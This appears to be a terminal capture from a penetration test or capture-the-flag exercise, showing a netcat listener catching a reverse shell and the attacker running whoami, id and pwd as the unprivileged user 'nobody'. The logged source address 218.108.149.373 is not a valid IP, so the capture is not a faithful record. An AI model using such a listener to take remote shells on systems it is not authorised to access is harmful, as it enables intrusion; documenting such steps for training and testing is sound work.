```
# nc -lnvp 65534
Listening on 0.0.0.0 65534
Connection received on 218.108.149.373 55268
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell

$ whoami
nobody

$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)

$ pwd
/nonexistent
```
